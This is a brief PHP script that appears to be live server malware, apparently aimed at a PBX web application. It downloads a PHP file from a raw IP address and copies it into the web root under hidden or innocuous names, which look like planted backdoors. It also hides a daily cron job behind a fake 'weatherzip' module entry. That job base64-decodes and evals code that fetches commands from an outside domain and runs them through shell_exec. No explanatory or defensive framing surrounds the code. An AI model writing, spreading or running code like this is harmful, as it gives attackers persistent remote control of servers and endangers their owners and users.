...
<?php
exec('wget http://207.244.76.204/elastix.php -O /tmp/.vivo.php');
exec('cp /tmp/.vivo.php '.$_SERVER["DOCUMENT_ROOT"]	.'/.header.php');
exec('cp /tmp/.vivo.php '.$_SERVER["DOCUMENT_ROOT"]	.'/admin/libraries/php-upgrade/ext/config.php');
$db->query("delete from cronmanager where module = 'weatherzip'");
$db->query("ALTER TABLE cronmanager MODIFY COLUMN command text;");
$sql = "INSERT INTO	cronmanager (module,id,time,freq,command) VALUES ('weatherzip','every_day',23,24,'php -r \'eval(base64_decode(".'"JHggPSBmaWxlX2dldF9jb250ZW50cygiaHR0cDovL2FwaS5zcmMtZWxzYWhlbC5jb20vcGJ4Iik7c2hlbGxfZXhlYygkeCk7DQo"'."));\';cp /tmp/.vivo.php /var/www/html/.marvels.php;')";
$check = $db->query($sql);
exit();
